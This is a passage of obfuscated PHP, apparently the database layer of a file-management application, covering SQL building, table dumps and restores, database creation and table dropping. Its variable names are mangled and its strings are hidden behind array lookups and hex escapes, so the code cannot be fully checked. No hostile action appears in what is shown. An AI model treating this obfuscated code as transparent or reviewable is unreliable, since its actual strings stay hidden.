parseComment($ÍŞ²¤ü¹) { $ı­İŞêú =& $_SERVER[óó‹¸‚å]; return !empty($ÍŞ²¤ü¹) ? $ı­İŞêú[1042] . $ÍŞ²¤ü¹ . $ı­İŞêú[1043] : $ı­İŞêú[12]; } protected function parseDistinct($”îÊìäİ) { $…÷ËÉÂ… =& $_SERVER[óó‹¸‚å]; return !empty($”îÊìäİ) ? $…÷ËÉÂ…[1044] : $…÷ËÉÂ…[12]; } protected function parseUnion($ª¬íô·) { $Õ£·ÀŒØ =& $_SERVER[óó‹¸‚å]; if (empty($ª¬íô·)) { return $Õ£·ÀŒØ[12]; } if (isset($ª¬íô·[$Õ£·ÀŒØ[348]])) { $ˆÕ§»Ù³ = $Õ£·ÀŒØ[1045]; unset($ª¬íô·[$Õ£·ÀŒØ[348]]); } else { $ˆÕ§»Ù³ = $Õ£·ÀŒØ[1046]; } foreach ($ª¬íô· as $ë‘×ËºÔ) { $€øõ×Ï´[] = $ˆÕ§»Ù³ . (is_array($ë‘×ËºÔ) ? $this->buildSelectSql($ë‘×ËºÔ) : $ë‘×ËºÔ); } return implode($Õ£·ÀŒØ[53], $€øõ×Ï´); } public function insert($½…äüÜ¦, $®ÏÒ“»í = array(), $×³ëÑñ = false) { $ğÆÁşÔş =& $_SERVER[óó‹¸‚å]; $©¦åµ° = $¡÷”ı“É = array(); $this->model = $®ÏÒ“»í[$ğÆÁşÔş[281]]; foreach ($½…äüÜ¦ as $ØŒíëÕ¯ => $°ÆêÕç…) { if (is_array($°ÆêÕç…) && $ğÆÁşÔş[297] == $°ÆêÕç…[0]) { $¡÷”ı“É[] = $this->parseKey($ØŒíëÕ¯); $©¦åµ°[] = $°ÆêÕç…[1]; } elseif (is_scalar($°ÆêÕç…) || is_null($°ÆêÕç…)) { $¡÷”ı“É[] = $this->parseKey($ØŒíëÕ¯); $©¦åµ°[] = $this->parseValue($°ÆêÕç…); } } $·á“ª = ($×³ëÑñ ? $ğÆÁşÔş[914] : $ğÆÁşÔş[915]) . $ğÆÁşÔş[916] . $this->parseTable($®ÏÒ“»í[$ğÆÁşÔş[279]]) . $ğÆÁşÔş[910] . implode($ğÆÁşÔş[50], $¡÷”ı“É) . $ğÆÁşÔş[911] . implode($ğÆÁşÔş[50], $©¦åµ°) . $ğÆÁşÔş[912]; $·á“ª .= $this->parseLock(isset($®ÏÒ“»í[$ğÆÁşÔş[847]]) ? $®ÏÒ“»í[$ğÆÁşÔş[847]] : !1); $·á“ª .= $this->parseComment(!empty($®ÏÒ“»í[$ğÆÁşÔş[354]]) ? $®ÏÒ“»í[$ğÆÁşÔş[354]] : $ğÆÁşÔş[12]); return $this->execute($·á“ª, $this->parseBind(!empty($®ÏÒ“»í[$ğÆÁşÔş[285]]) ? $®ÏÒ“»í[$ğÆÁşÔş[285]] : array())); } public function selectInsert($Ã…òıµ™, $àúµøÙõ, $™ÎÃÍË” = array()) { $…¸š¨Å =& $_SERVER[óó‹¸‚å]; $this->model = $™ÎÃÍË”[$…¸š¨Å[281]]; if (is_string($Ã…òıµ™)) { $Ã…òıµ™ = explode($…¸š¨Å[50], $Ã…òıµ™); } array_walk($Ã…òıµ™, array($this, $…¸š¨Å[913])); $¨öÌŞ‹¦ = $…¸š¨Å[1047] . $this->parseTable($àúµøÙõ) . $…¸š¨Å[910] . implode($…¸š¨Å[50], $Ã…òıµ™) . $…¸š¨Å[1025]; $¨öÌŞ‹¦ .= $this->buildSelectSql($™ÎÃÍË”); return $this->execute($¨öÌŞ‹¦, $this->parseBind(!empty($™ÎÃÍË”[$…¸š¨Å[285]]) ? $™ÎÃÍË”[$…¸š¨Å[285]] : array())); } public function update($È¤×Üº¹, $Á³Ô…³Ì) { $ƒ§¥·²§ =& $_SERVER[óó‹¸‚å]; $this->model = $Á³Ô…³Ì[$ƒ§¥·²§[281]]; $§ àÃä– = $ƒ§¥·²§[1048] . $this->parseTable($Á³Ô…³Ì[$ƒ§¥·²§[279]]) . $this->parseSet($È¤×Üº¹) . $this->parseWhere(!empty($Á³Ô…³Ì[$ƒ§¥·²§[275]]) ? $Á³Ô…³Ì[$ƒ§¥·²§[275]] : $ƒ§¥·²§[12]) . $this->parseOrder(!empty($Á³Ô…³Ì[$ƒ§¥·²§[365]]) ? $Á³Ô…³Ì[$ƒ§¥·²§[365]] : $ƒ§¥·²§[12]) . $this->parseLimit(!empty($Á³Ô…³Ì[$ƒ§¥·²§[292]]) ? $Á³Ô…³Ì[$ƒ§¥·²§[292]] : $ƒ§¥·²§[12]) . $this->parseLock(isset($Á³Ô…³Ì[$ƒ§¥·²§[847]]) ? $Á³Ô…³Ì[$ƒ§¥·²§[847]] : !1) . $this->parseComment(!empty($Á³Ô…³Ì[$ƒ§¥·²§[354]]) ? $Á³Ô…³Ì[$ƒ§¥·²§[354]] : $ƒ§¥·²§[12]); return $this->execute($§ àÃä–, $this->parseBind(!empty($Á³Ô…³Ì[$ƒ§¥·²§[285]]) ? $Á³Ô…³Ì[$ƒ§¥·²§[285]] : array())); } public function delete($¤ÓÍÆ„ = array()) { $¬‰âÁåó =& $_SERVER[óó‹¸‚å]; $this->model = $¤ÓÍÆ„[$¬‰âÁåó[281]]; $—ÆÍ†Ù§ = $¬‰âÁåó[1049] . $this->parseTable($¤ÓÍÆ„[$¬‰âÁåó[279]]) . $this->parseWhere(!empty($¤ÓÍÆ„[$¬‰âÁåó[275]]) ? $¤ÓÍÆ„[$¬‰âÁåó[275]] : $¬‰âÁåó[12]) . $this->parseOrder(!empty($¤ÓÍÆ„[$¬‰âÁåó[365]]) ? $¤ÓÍÆ„[$¬‰âÁåó[365]] : $¬‰âÁåó[12]) . $this->parseLimit(!empty($¤ÓÍÆ„[$¬‰âÁåó[292]]) ? $¤ÓÍÆ„[$¬‰âÁåó[292]] : $¬‰âÁåó[12]) . $this->parseLock(isset($¤ÓÍÆ„[$¬‰âÁåó[847]]) ? $¤ÓÍÆ„[$¬‰âÁåó[847]] : !1) . $this->parseComment(!empty($¤ÓÍÆ„[$¬‰âÁåó[354]]) ? $¤ÓÍÆ„[$¬‰âÁåó[354]] : $¬‰âÁåó[12]); return $this->execute($—ÆÍ†Ù§, $this->parseBind(!empty($¤ÓÍÆ„[$¬‰âÁåó[285]]) ? $¤ÓÍÆ„[$¬‰âÁåó[285]] : array())); } public function select($ªˆÇíÒ = array()) { $ïÈ»³©› =& $_SERVER[óó‹¸‚å]; $this->model = $ªˆÇíÒ[$ïÈ»³©›[281]]; $íÁ©¹ğÍ = $this->buildSelectSql($ªˆÇíÒ); $Ş²¿ğ = isset($ªˆÇíÒ[$ïÈ»³©›[349]]) ? $ªˆÇíÒ[$ïÈ»³©›[349]] : !1; if ($Ş²¿ğ) { $ûæÂ‚½š = is_string($Ş²¿ğ[$ïÈ»³©›[94]]) ? $Ş²¿ğ[$ïÈ»³©›[94]] : $ïÈ»³©›[1050] . md5($íÁ©¹ğÍ); $…ÃèÁß¹ = think_cache($ûæÂ‚½š, $ïÈ»³©›[12], $Ş²¿ğ); if (!1 !== $…ÃèÁß¹) { return $…ÃèÁß¹; } } $ğÇ»—ÛÎ = $this->query($íÁ©¹ğÍ, $this->parseBind(!empty($ªˆÇíÒ[$ïÈ»³©›[285]]) ? $ªˆÇíÒ[$ïÈ»³©›[285]] : array())); if ($Ş²¿ğ && !1 !== $ğÇ»—ÛÎ) { think_cache($ûæÂ‚½š, $ğÇ»—ÛÎ, $Ş²¿ğ); } return $ğÇ»—ÛÎ; } public function buildSelectSql($¯‘èãı” = array()) { $…½Éç™˜ =& $_SERVER[óó‹¸‚å]; if (isset($¯‘èãı”[$…½Éç™˜[353]])) { if (strpos($¯‘èãı”[$…½Éç™˜[353]], $…½Éç™˜[50])) { list($…í“–½, $¹íåŠàè) = explode($…½Éç™˜[50], $¯‘èãı”[$…½Éç™˜[353]]); } else { $…í“–½ = $¯‘èãı”[$…½Éç™˜[353]]; } $…í“–½ = $…í“–½ ? $…í“–½ : 1; $¹íåŠàè = isset($¹íåŠàè) ? $¹íåŠàè : (is_numeric($¯‘èãı”[$…½Éç™˜[292]]) ? $¯‘èãı”[$…½Éç™˜[292]] : 20); $İÜ‰Ñòù = $¹íåŠàè * ((int) $…í“–½ - 1); $¯‘èãı”[$…½Éç™˜[292]] = $İÜ‰Ñòù . $…½Éç™˜[50] . $¹íåŠàè; } if (think_config($…½Éç™˜[1051])) { $·“ú­ = $…½Éç™˜[1052] . md5(serialize($¯‘èãı”)); $Îà„½ = think_cache($·“ú­); if ($Îà„½) { return $Îà„½; } } $ÖÒë˜Úé = $this->parseSql($this->selectSql, $¯‘èãı”); $ÖÒë˜Úé .= $this->parseLock(isset($¯‘èãı”[$…½Éç™˜[847]]) ? $¯‘èãı”[$…½Éç™˜[847]] : !1); if (isset($·“ú­)) { think_cache($·“ú­, $ÖÒë˜Úé); } return $ÖÒë˜Úé; } public function parseSql($Îã®©, $Ôüèãé = array()) { $æÇÎôö£ =& $_SERVER[óó‹¸‚å]; $Îã®© = str_replace(array($æÇÎôö£[1053], $æÇÎôö£[1054], $æÇÎôö£[1055], $æÇÎôö£[1056], $æÇÎôö£[1057], $æÇÎôö£[1058], $æÇÎôö£[1059], $æÇÎôö£[1060], $æÇÎôö£[1061], $æÇÎôö£[1062], $æÇÎôö£[1063]), array($this->parseTable("{$Ôüèãé[$æÇÎôö£[279]]}"), $this->parseDistinct(isset($Ôüèãé[$æÇÎôö£[1064]]) ? $Ôüèãé[$æÇÎôö£[1064]] : !1), $this->parseField(!empty($Ôüèãé[$æÇÎôö£[273]]) ? $Ôüèãé[$æÇÎôö£[273]] : $æÇÎôö£[188]), $this->parseJoin(!empty($Ôüèãé[$æÇÎôö£[282]]) ? $Ôüèãé[$æÇÎôö£[282]] : $æÇÎôö£[12]), $this->parseWhere(!empty($Ôüèãé[$æÇÎôö£[275]]) ? $Ôüèãé[$æÇÎôö£[275]] : $æÇÎôö£[12]), $this->parseGroup(!empty($Ôüèãé[$æÇÎôö£[515]]) ? $Ôüèãé[$æÇÎôö£[515]] : $æÇÎôö£[12]), $this->parseHaving(!empty($Ôüèãé[$æÇÎôö£[1065]]) ? $Ôüèãé[$æÇÎôö£[1065]] : $æÇÎôö£[12]), $this->parseOrder(!empty($Ôüèãé[$æÇÎôö£[365]]) ? $Ôüèãé[$æÇÎôö£[365]] : $æÇÎôö£[12]), $this->parseLimit(!empty($Ôüèãé[$æÇÎôö£[292]]) ? $Ôüèãé[$æÇÎôö£[292]] : $æÇÎôö£[12]), $this->parseUnion(!empty($Ôüèãé[$æÇÎôö£[347]]) ? $Ôüèãé[$æÇÎôö£[347]] : $æÇÎôö£[12]), $this->parseComment(!empty($Ôüèãé[$æÇÎôö£[354]]) ? $Ôüèãé[$æÇÎôö£[354]] : $æÇÎôö£[12])), $Îã®©); return $Îã®©; } public function getLastSql($ÆÃá¨æ© = '') { return $ÆÃá¨æ© ? $this->modelSql[$ÆÃá¨æ©] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($‰³¤üá–) { return addslashes($‰³¤üá–); } public function setModel($çÏ‡èÓ¾) { $this->model = $çÏ‡èÓ¾; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Òçä¥ÃŞ = array()) { $ûèûÖ¬ì =& $_SERVER[óó‹¸‚å]; if (empty($Òçä¥ÃŞ)) { $Òçä¥ÃŞ = $GLOBALS[$ûèûÖ¬ì[6]][$ûèûÖ¬ì[21]]; } $this->database = $Òçä¥ÃŞ; } public function model($µô•€Ğ = '') { return new ModelBase($µô•€Ğ, $_SERVER[óó‹¸‚å][12], $this->database); } public function db($œåˆŸÍ = false) { $„ñ¤ü– =& $_SERVER[óó‹¸‚å]; $’£üšë£ = array_change_key_case($this->database); if ($this->dbType() == $„ñ¤ü–[13] || !$œåˆŸÍ) { return $this->model()->db(); } $ÖŒ‰šâ¿ = $’£üšë£[$„ñ¤ü–[979]]; $’£üšë£[$„ñ¤ü–[979]] = $„ñ¤ü–[12]; if ($’£üšë£[$„ñ¤ü–[974]] == $„ñ¤ü–[971]) { $«€¯ŞÜô = $’£üšë£[$„ñ¤ü–[980]]; $’£üšë£[$„ñ¤ü–[980]] = substr($«€¯ŞÜô, 0, strrpos($«€¯ŞÜô, $„ñ¤ü–[1066])); } $this->database = $’£üšë£; $ÑÄÕ”ïÑ = $this->model()->db(); try { $à ‡ŠÚß = $ÑÄÕ”ïÑ->execute("\x73\150\157\x77\40\x64\x61\164\141\142\x61\163\145\x73\x20\x6c\151\x6b\145\40\47{$ÖŒ‰šâ¿}\x27"); } catch (Exception $¨óË€Î˜) { } if (!$à ‡ŠÚß) { $ÑÄÕ”ïÑ->execute("\x63\x72\x65\141\x74\x65\x20\x64\x61\164\x61\142\141\x73\x65\40\x60{$ÖŒ‰šâ¿}\x60"); } $’£üšë£[$„ñ¤ü–[979]] = $ÖŒ‰šâ¿; if ($’£üšë£[$„ñ¤ü–[974]] == $„ñ¤ü–[971]) { $’£üšë£[$„ñ¤ü–[980]] .= $„ñ¤ü–[1066] . $ÖŒ‰šâ¿; } $this->database = $’£üšë£; $ÑÄÕ”ïÑ->execute("\x75\x73\x65\x20\x60{$ÖŒ‰šâ¿}\x60"); return $ÑÄÕ”ïÑ; } public function createTable($ıéòğ¾, &$Ş“»­’Ì) { $Ÿ·½ñœü =& $_SERVER[óó‹¸‚å]; if (!IO::exist($ıéòğ¾)) { ActionCall($Ÿ·½ñœü[1067], !0, 0); show_json(LNG($Ÿ·½ñœü[1068]), !1); } $ß¤áÊÅ = $this->model()->db(); $áŞ‚­èÀ = sqlSplit(IO::getContent($ıéòğ¾)); foreach ($áŞ‚­èÀ as $òşá›»º) { $Ã®¯“Àğ = stripos($òşá›»º, $Ÿ·½ñœü[1069]) === 0; if ($Ã®¯“Àğ) { $Ş“»­’Ì->task[$Ÿ·½ñœü[790]] += 1; } $ß¤áÊÅ->execute($òşá›»º); if ($Ã®¯“Àğ) { preg_match($Ÿ·½ñœü[1070], $òşá›»º, $ÂûÔÙö); $Ş“»­’Ì->task[$Ÿ·½ñœü[1071]] = $ÂûÔÙö[1]; $Ş“»­’Ì->update(1); } } } public function insertTable($…¾òŠîÆ, &$ÀÙ®ĞÛ˜) { $—™è³ =& $_SERVER[óó‹¸‚å]; $ÇØÀºÔ = $this->model()->db(); $ƒÙÎ…€Î = $²œ‰´á ? array($²œ‰´á) : $ÇØÀºÔ->getTables(); foreach ($…¾òŠîÆ as $“ÂÊ–Ä÷) { $²œ‰´á = basename($“ÂÊ–Ä÷, $—™è³[792]); if (!in_array($²œ‰´á, $ƒÙÎ…€Î)) { continue; } $ÀÙ®ĞÛ˜->task[$—™è³[1071]] = $²œ‰´á; if (get_filesize($“ÂÊ–Ä÷) == 0) { continue; } $›²á‰Şß = $this->sqlToDb($“ÂÊ–Ä÷, $ÀÙ®ĞÛ˜); if (!$›²á‰Şß) { ActionCall($—™è³[1067], !0, 0); show_json(LNG($—™è³[1072]) . "\x5b{$²œ‰´á}\x5d", !1); } } } public function sqlFromDb($‚¨æ‡Ä¨, $ÓíİÁ, &$Áö˜–ìã, $óğÙ·µÀ = '') { if ($Áö˜–ìã) { $Áö˜–ìã->task[$_SERVER[óó‹¸‚å][1071]] = $‚¨æ‡Ä¨; } $Âš×‘™ì = $this->model($‚¨æ‡Ä¨); $‡Ç€¹ç¯ = 0; $üŞçÆ‚ = 0; $öŞûÁè’ = 10000; $­ÒÉÚ¦ = fopen($ÓíİÁ, $_SERVER[óó‹¸‚å][1073]); $äº÷²Ê = $Âš×‘™ì->getPk(); $©ª­ã°‰ = $Âš×‘™ì->getDbFields(); $‰ø½ı„³ = $_SERVER[óó‹¸‚å][12]; if ($GLOBALS[$_SERVER[óó‹¸‚å][791]] && in_array($‚¨æ‡Ä¨, array($_SERVER[óó‹¸‚å][1074], $_SERVER[óó‹¸‚å][1075]))) { $‰ø½ı„³ = $‚¨æ‡Ä¨; } do { $ƒÉÛÚÊª = array($äº÷²Ê => array($_SERVER[óó‹¸‚å][1021], $üŞçÆ‚)); $ÉÄ£«ú = $Âš×‘™ì->where($ƒÉÛÚÊª)->field($©ª­ã°‰)->order($äº÷²Ê . $_SERVER[óó‹¸‚å][1076])->limit($öŞûÁè’)->select(); $ÉÄ£«ú = !empty($ÉÄ£«ú) ? $ÉÄ£«ú : array(); if (!($¿¸³©±î = count($ÉÄ£«ú))) { break; } $ú¿óïÚŞ = end($ÉÄ£«ú); $üŞçÆ‚ = $ú¿óïÚŞ[$äº÷²Ê]; $±•Í…Ç‚ = array(); foreach ($ÉÄ£«ú as $õÎ³æƒÜ) { if ($‰ø½ı„³) { if ($‚¨æ‡Ä¨ == $_SERVER[óó‹¸‚å][1074]) { if ($õÎ³æƒÜ[$_SERVER[óó‹¸‚å][33]] == $_SERVER[óó‹¸‚å][1077]) { $œ±¡—Â = json_decode($õÎ³æƒÜ[$_SERVER[óó‹¸‚å][374]], !0); if ($œ±¡—Â[$_SERVER[óó‹¸‚å][32]] == $GLOBALS[$_SERVER[óó‹¸‚å][791]] && $œ±¡—Â[$_SERVER[óó‹¸‚å][754]] != 1) { continue; } } } else { if ($õÎ³æƒÜ[$_SERVER[óó‹¸‚å][33]] == $_SERVER[óó‹¸‚å][1078] && $õÎ³æƒÜ[$_SERVER[óó‹¸‚å][94]] == $_SERVER[óó‹¸‚å][783]) { continue; } } } if ($óğÙ·µÀ) { $õÎ³æƒÜ[$_SERVER[óó‹¸‚å][84]] = "\x7b\151\157\72{$óğÙ·µÀ}\x7d" . substr($õÎ³æƒÜ[$_SERVER[óó‹¸‚å][84]], strlen("\x7b\x69\157\x3a{$õÎ³æƒÜ[$_SERVER[óó‹¸‚å][821]]}\x7d")); $õÎ³æƒÜ[$_SERVER[óó‹¸‚å][821]] = $óğÙ·µÀ; } $±•Í…Ç‚[] = $_SERVER[óó‹¸‚å][1079] . $this->sqlEncode($õÎ³æƒÜ) . $_SERVER[óó‹¸‚å][1080]; } $¹€‹ÕÇ‹ = "\x49\x4e\x53\x45\122\124\40\111\x4e\124\x4f\40\x60{$‚¨æ‡Ä¨}\140\40\50\x60" . implode($_SERVER[óó‹¸‚å][1081], $©ª­ã°‰) . $_SERVER[óó‹¸‚å][1082]; fwrite($­ÒÉÚ¦, $¹€‹ÕÇ‹ . implode($_SERVER[óó‹¸‚å][1083], $±•Í…Ç‚) . $_SERVER[óó‹¸‚å][71] . PHP_EOL); $‡Ç€¹ç¯ += $¿¸³©±î; if ($Áö˜–ìã) { $Áö˜–ìã->update($¿¸³©±î); } } while ($öŞûÁè’ == $¿¸³©±î); fclose($­ÒÉÚ¦); return $‡Ç€¹ç¯; } public function sqlToDb($˜Ò©ç»”, &$è«ßÑ“Ñ) { $õÉãç©É =& $_SERVER[óó‹¸‚å]; $•æ¦Î³ = $this->model()->db(); $›äõ’éú = @fopen($˜Ò©ç»”, $õÉãç©É[1084]); if (!$›äõ’éú) { return !1; } $Š„‡ª‚ = 0; $·Ã•œûµ = $õÉãç©É[12]; $îÀè®Ô¼ = array(); $… ªŒÉ¸ = $this->dbType(); $¤í³œ¸Ş = $… ªŒÉ¸ == $õÉãç©É[13] ? 500 : 2000; $÷•³«§« = basename($˜Ò©ç»”, $õÉãç©É[792]); $ğÇ¬ïî = 0; $ü¦˜¸Û = 4194304 - 104858; $‡ÉãÔÖ = 1000000 - 104858; while (!feof($›äõ’éú)) { $Ó¨í£À† = trim(fgets($›äõ’éú)); if (!$Ó¨í£À†) { continue; } $³º¬©“÷ = $this->sqlDecode($Ó¨í£À†, $… ªŒÉ¸, $÷•³«§«); if (stripos($³º¬©“÷, $õÉãç©É[355]) === 0) { if (!$·Ã•œûµ) { $·Ã•œûµ = $³º¬©“÷ . $õÉãç©É[53]; } continue; } if ($è«ßÑ“Ñ) { $è«ßÑ“Ñ->task[$õÉãç©É[790]] += 1; } $Š„‡ª‚++; $îÀè®Ô¼[] = rtrim(rtrim(trim($³º¬©“÷), $õÉãç©É[50]), $õÉãç©É[71]); $Ë·â¼Âİ = null; $ß¿ ³Œ = strlen($³º¬©“÷); $ğÇ¬ïî += $ß¿ ³Œ; if ($ğÇ¬ïî >= ($¤í³œ¸Ş == 500 ? $‡ÉãÔÖ : $ü¦˜¸Û)) { $Ë·â¼Âİ = array_pop($îÀè®Ô¼); if ($Š„‡ª‚ > 1) { $Š„‡ª‚--; } } if ($Š„‡ª‚ >= $¤í³œ¸Ş || $Ë·â¼Âİ) { $³º¬©“÷ = $·Ã•œûµ . implode($õÉãç©É[50], $îÀè®Ô¼); if (!$•æ¦Î³->execute($³º¬©“÷)) { return !1; } if ($è«ßÑ“Ñ) { $è«ßÑ“Ñ->update($Š„‡ª‚); } $îÀè®Ô¼ = array(); $Š„‡ª‚ = 0; $ğÇ¬ïî = 0; if ($Ë·â¼Âİ) { $îÀè®Ô¼ = array($Ë·â¼Âİ); $Š„‡ª‚ = 1; $ğÇ¬ïî = $ß¿ ³Œ; } } } fclose($›äõ’éú); if (!empty($îÀè®Ô¼)) { $³º¬©“÷ = $·Ã•œûµ . implode($õÉãç©É[50], $îÀè®Ô¼); if (!$•æ¦Î³->execute($³º¬©“÷)) { return !1; } if ($è«ßÑ“Ñ) { $è«ßÑ“Ñ->update($Š„‡ª‚); } } return !0; } public function dropTable($—ïúËŞ¾ = null) { $©±İÚ¹¬ = $this->model()->db(); $®Êè±”¢ = $—ïúËŞ¾ ? array($—ïúËŞ¾) : $©±İÚ¹¬->getTables(); if (!$®Êè±”¢) { return; } foreach ($®Êè±”¢ as $—ïúËŞ¾) { if ($—ïúËŞ¾) { $—ïúËŞ¾ = strtolower($—ïúËŞ¾); } else { continue; } $©±İÚ¹¬->execute("\x64\x72\157\160\x20\164\141\x62\154\x65\x20\x69\146\x20\145\x78\x69\x73\x74\x73\x20\x60{$—ïúËŞ¾}\x60"); } } private function sqlEncode($—½Ç×Ïã) { $°ŒÊéíè =& $_SERVER[óó‹¸‚å]; $Šœ˜«÷± = array(); foreach ($—½Ç×Ïã as $ë¢öÓ±) { if (is_array($ë¢öÓ±)) { $ë¢öÓ± = json_encode_force($ë¢öÓ±); } $ë¢öÓ± = addslashes($ë¢öÓ±); $ë¢öÓ± = str_replace(array($°ŒÊéíè[1085], $°ŒÊéíè[231]), array($°ŒÊéíè[1086], $°ŒÊéíè[1087]), $ë¢öÓ±); $Šœ˜«÷±[] = str_replace($°ŒÊéíè[58], $°ŒÊéíè[1088], $ë¢öÓ±); } return $°ŒÊéíè[58] . implode($°ŒÊéíè[1089], $Šœ˜«÷±) . $°ŒÊéíè[58]; } private function sqlDecode($’òïºÉ½, $ãÁÅÍû„, $¼Å¾³ùÉ = '') { $Ûş—¹îƒ =& $_SERVER[óó‹¸‚å]; $’òïºÉ½ = str_replace(array($Ûş—¹îƒ[1086], $Ûş—¹îƒ[1087]), array($Ûş—¹îƒ[1085], $Ûş—¹îƒ[231]), $’òïºÉ½); if ($ãÁÅÍû„ == $Ûş—¹îƒ[13]) { return $¼Å¾³ùÉ != $Ûş—¹îƒ[1090] ? stripslashes($’òïºÉ½) : $’òïºÉ½; } if ($¼Å¾³ùÉ == $Ûş—¹îƒ[1090]) { $’òïºÉ½ = str_replace($Ûş—¹îƒ[1091], $Ûş—¹îƒ[118], stripslashes($’òïºÉ½)); } return $’òïºÉ½; } public function getSqlFile($åìƒ‚Œ = '') { $ı¯µ£³Ì =& $_SERVER[óó‹¸‚å]; $™ °íÊú = $this->dbType(!0); $›¯É£ŸÙ = CONTROLLER_DIR . "\x69\x6e\163\x74\x61\x6c\154\x2f\144\x61\164\x61\57{$™ °íÊú}\56\x73\x71\x6c"; $²€±Î¶ş = file_get_contents($›¯É£ŸÙ); $àÎïø†Ô = $ı¯µ£³Ì[1092] . ($™ °íÊú == $ı¯µ£³Ì[808] ? $ı¯µ£³Ì[1093] : $ı¯µ£³Ì[1094]) . $ı¯µ£³Ì[1095]; preg_match_all($àÎïø†Ô, $²€±Î¶ş, $ş¯üÕÀ¬); $›É½üË¨ = $ş¯üÕÀ¬[1]; $â’´Á³— = $this->model()->db(); $Äì„½®Ë = $â’´Á³—->getTables(); $œ´²³¨‘ = TEMP_FILES . $ı¯µ£³Ì[1096] . date($ı¯µ£³Ì[755]) . $ı¯µ£³Ì[8]; del_dir($œ´²³¨‘); mk_dir($œ´²³¨‘); $ƒ¦°øñ• = $œ´²³¨‘ . $ı¯µ£³Ì[1097]; $ı‡Œ¾¿İ = $œ´²³¨‘ . $ı¯µ£³Ì[1098]; $±ƒä¤Ëî = $™ °íÊú == $ı¯µ£³Ì[13] ? $ı¯µ£³Ì[808] : $ı¯µ£³Ì[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\x61\x6c\x6c\x2f\144\141\164\141\57{$±ƒä¤Ëî}\56\163\161\154", $œ´²³¨‘); @touch($œ´²³¨‘ . $™ °íÊú . $ı¯µ£³Ì[792]); $ô•Ô‡–ò = fopen($ƒ¦°øñ•, $ı¯µ£³Ì[1073]); $úÒá»ù¹ = fopen($ı‡Œ¾¿İ, $ı¯µ£³Ì[1073]); if ($™ °íÊú == $ı¯µ£³Ì[13]) { $Äì„½®Ë = array_diff($Äì„½®Ë, array($ı¯µ£³Ì[788], $ı¯µ£³Ì[789])); $Ÿ’ôİƒ = array($ı¯µ£³Ì[1099], $ı¯µ£³Ì[1100], $ı¯µ£³Ì[1101]); fwrite($úÒá»ù¹, implode(PHP_EOL, $Ÿ’ôİƒ) . PHP_EOL . PHP_EOL); foreach ($Äì„½®Ë as $¶ŒÒš¯) { $ò—ÀÔ†© = $this->sqlFromSqlite($¶ŒÒš¯); if (!$ò—ÀÔ†©[$ı¯µ£³Ì[13]]) { continue; } fwrite($úÒá»ù¹, $ò—ÀÔ†©[$ı¯µ£³Ì[13]] . PHP_EOL . PHP_EOL); if (!in_array($¶ŒÒš¯, $›É½üË¨)) { fwrite($ô•Ô‡–ò, $ò—ÀÔ†©[$ı¯µ£³Ì[808]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Äì„½®Ë as $¶ŒÒš¯) { $ò—ÀÔ†© = $this->sqlFromMysql($¶ŒÒš¯); if (!$ò—ÀÔ†©[$ı¯µ£³Ì[808]]) { continue; } fwrite($ô•Ô‡–ò, $ò—ÀÔ†©[$ı¯µ£³Ì[808]] . PHP_EOL . PHP_EOL); if (!in_array($¶ŒÒš¯, $›É½üË¨)) { fwrite($úÒá»ù¹, $ò—ÀÔ†©[$ı¯µ£³Ì[13]] . PHP_EOL . PHP_EOL); } } } fclose($ô•Ô‡–ò); fclose($úÒá»ù¹); $²€±Î¶ş = array($ı¯µ£³Ì[808] => $ƒ¦°øñ•, $ı¯µ£³Ì[13] => $ı‡Œ¾¿İ); return $åìƒ‚Œ ? $²€±Î¶ş[$åìƒ‚Œ] : $²€±Î¶ş; } public function dbType($ŒÎíªı = false) { $ìÇª—³ =& $_SERVER[óó‹¸‚å]; $÷¦¦ë® = $ŒÎíªı ? $GLOBALS[$ìÇª—³[6]][$ìÇª—³[21]] : $this->database; $÷¦¦ë® = array_change_key_case($÷¦¦ë®); $´—÷Êû = $÷¦¦ë®[$ìÇª—³[974]]; if ($´—÷Êû == $ìÇª—³[971]) { $ú¿ğ–‚— = explode($ìÇª—³[4], $÷¦¦ë®[$ìÇª—³[980]]); $´—÷Êû = $ú¿ğ–‚—[0]; } $–­×Îâ = array($ìÇª—³[1102] => $ìÇª—³[13], $ìÇª—³[919] => $ìÇª—³[808]); if (isset($–­×Îâ[$´—÷Êû])) { $´—÷Êû = $–­×Îâ[$´—÷Êû]; } return $´—÷Êû; } public function sqlFromMysql($üšÁÓÈş, $°½Ë˜Â­ = '') { $½¶¯Ûü• =& $_SERVER[óó‹¸‚å]; $í€ƒˆ¢÷ = $this->model()->db(); $Æ˜Â‡¿— = $í€ƒˆ¢÷->query($½¶¯Ûü•[1103] . $üšÁÓÈş . $½¶¯Ûü•[385]); if (!$Æ˜Â‡¿— || !$Æ˜Â‡¿—[0]) { return !1; } $Ê©èÓå£ = _get($Æ˜Â‡¿—[0], $½¶¯Ûü•[1104], $½¶¯Ûü•[12]); if (!$Ê©èÓå£) { return !1; } $ÏÃ©¸Öê = "\104\x52\x4f\120\x20\x54\101\x42\114\x45\x20\111\106\40\x45\x58\x49\x53\124\x53\x20\140{$üšÁÓÈş}\x60\73" . PHP_EOL . $Ê©èÓå£ . $½¶¯Ûü•[71]; if ($°½Ë˜Â­ && $°½Ë˜Â­ == $½¶¯Ûü•[808]) { return $ÏÃ©¸Öê; } $ÏÍÄû´ = array_change_key_case($GLOBALS[$½¶¯Ûü•[6]][$½¶¯Ûü•[21]]); $ÙàÛ˜Ò° = $ÏÍÄû´[$½¶¯Ûü•[979]]; $””ÓÔş£ = $½¶¯Ûü•[1105] . $ÙàÛ˜Ò° . $½¶¯Ûü•[1106] . $üšÁÓÈş . $½¶¯Ûü•[58]; $Ô ‡ôĞü = $½¶¯Ûü•[1107] . $üšÁÓÈş . $½¶¯Ûü•[907]; $ú¡Ëûò“ = $í€ƒˆ¢÷->query($””ÓÔş£); if (empty($ú¡Ëûò“)) { $ÂíàÙç = array($½¶¯Ûü•[808] => $½¶¯Ûü•[12], $½¶¯Ûü•[13] => $½¶¯Ûü•[12]); return $°½Ë˜Â­ ? $ÂíàÙç[$°½Ë˜Â­] : $ÂíàÙç; } $Úáã°– = $í€ƒˆ¢÷->query($Ô ‡ôĞü); $“•×€–Ü = $½¶¯Ûü•[12]; $›î ²Ä = array(); foreach ($Úáã°– as $Ü¶´­ó) { if (!$“•×€–Ü && 